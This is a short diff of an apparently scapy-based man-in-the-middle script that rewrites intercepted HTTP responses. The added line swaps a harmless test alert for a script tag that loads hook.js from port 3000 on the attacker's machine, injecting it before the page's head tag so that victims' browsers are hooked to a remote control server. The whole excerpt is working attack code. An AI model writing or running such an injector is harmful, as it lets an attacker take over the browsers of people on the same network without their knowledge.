@@ -26,7 +26,7 @@ def process_packet(packet):
     
             elif scapy_packet[inet.TCP].sport == 80:
                 print("Response: Injecting code...")
-                injection_code = "<script>alert('test');</script>"
+                injection_code = '<script src="http://<IP-of-your-hacking-machine>:3000/hook.js"></script>'
                 load = load.replace("<head>", injection_code + "<head>")
                 content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                 if content_length_search and "text/html" in load:
